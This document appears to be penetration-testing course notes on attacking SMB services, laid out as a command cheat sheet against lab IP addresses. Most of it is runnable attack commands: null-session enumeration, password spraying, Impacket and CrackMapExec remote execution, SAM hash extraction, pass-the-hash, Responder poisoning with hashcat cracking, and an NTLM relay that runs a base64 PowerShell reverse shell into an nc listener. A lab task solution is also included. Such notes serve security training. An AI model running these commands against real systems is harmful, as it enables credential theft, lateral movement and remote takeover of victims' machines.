### Attacking SMB

```
# Enumeration

# For instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, 
# but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. 
# This means that SMB is running with NetBIOS over TCP/IP. 
# (UDP ports: 137 and 138.)

sudo nmap 10.129.14.128 -sV -sC -p139,445       # check ports with nmap
```

```
# Misconfigurations

# SMB can be configured not to require authentication, which is often called a null session. 
# Instead, we can log in to a system with no username or password.

smbclient -N -L //10.129.14.128                # list of the server's: -L, use the null session: -N
smbmap -H 10.129.14.128                        # basic example of submap
smbmap -H 10.129.14.128 -r notes               # recursive search in notes share
smbmap -H 10.129.14.128 --download "notes\note.txt"         # download if have READ permissions
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"  # upload if have WRITE permissions

rpcclient -U'%' 10.10.110.17                   # tool with a null session to enumerate a target host
rpcclient $> enumdomusers                      # enumerate users inside host
```

```

### Protocol Specifics Attacks

```
# If a null session is not enabled, we will need credentials to interact with the SMB protocol. 
# Two common ways to obtain credentials are brute forcing and password spraying.
```

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

# Using the --continue-on-success flag will continue spraying even after a valid password is found. 
# it is very useful for spraying a single password against a large user list. 
# Additionally, if we are targetting a non-domain joined computer, we will need to use the option --local-auth. 
```


### Remote Code Execution (RCE)

```
# PsExec is a tool that lets us execute processes on other systems, 
# complete with full interactivity for console applications, without having to install client software manually. 
# It works because it has a Windows service image inside of its executable.
```

[PsExec from MS site](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

[ImpacketPsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) 

```
# Python PsExec like functionality example using RemComSvc
```

[Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

```
# A similar approach to PsExec without using RemComSvc.
```

[Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)

```
# This example executes a command on the target machine through the 
# Task Scheduler service and returns the output of the executed command.
```

```
# includes an implementation of smbexec and atexec.

### Impacket PsExec

```
impacket-psexec -h                                               # help command to show all options
impacket-psexec administrator:'Password123!'@10.10.110.17        # basic example of command
```  

### CrackMapExec

```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec # Login through smb
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users      # Enumerating Logged-on Users
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam                   # Extract Hashes from SAM Database
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE       # Login with Pass-the-Hash (PtH)
```

### Forced Authentication Attacks

[Responder](https://github.com/lgandx/Responder)

```
responder -I <interface name>
sudo responder -I ens33
```

[hashcat](https://hashcat.net/hashcat/)

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt   # cracking pass with related tool module -m 5600
```

```
# The NTLMv2 hash was cracked. The password is P@ssword. 
# If we cannot crack the hash, we can potentially relay the captured hash 
# to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. 

# First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).

cat /etc/responder/Responder.conf | grep 'SMB ='

# Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, 
# and the target machine with the option -t.

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# We can create a PowerShell reverse shell using https://www.revshells.com/, 
# set our machine IP address, port, and the option Powershell #3 (Base64).

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgA...ACkA'

# Once the victim authenticates to our server, we poison the response 
# and make it execute our command to obtain a reverse shell.

nc -lvnp 9001

### Task Solution

10.129.203.6

sudo nmap 10.129.203.6 -sV -sC -p139,445   # to check services
smbclient -N -L //10.129.203.6             # to check share with read permissions
hydra -l jason -P /home/user/atck-common-svs/pws.list smb://10.129.203.6   # not working 
crackmapexec smb 10.129.203.6 -u jason -p /home/user/atck-common-svs/pws.list --local-auth  # got creds, pass file from resources
ssh jason@10.129.203.6                     # not working , need id_rsa file
smbclient -U jason \\\\10.129.203.6\\GGJ   # login with jason creds from above step

cat flag.txt                               # ctf
```

### Attacking Common Services 

```
# One recent significant vulnerability that affected the SMB protocol was called SMBGhost with the CVE-2020-0796. 
# The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 
# vulnerable to attack by an unauthenticated attacker. 
# The vulnerability allowed the attacker to gain remote code execution (RCE) and full access to the remote target system.
```

[CVE-2020-0796](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796)
[SMBGhost-MSF](https://www.exploit-db.com/exploits/48537)

```
# The Concept of the Attack

In simple terms, this is an integer overflow vulnerability in a function of an SMB driver 
# that allows system commands to be overwritten while accessing memory.
# An integer overflow results from a CPU attempting to generate a number that is greater than the value required 
# for the allocated memory space. 
```
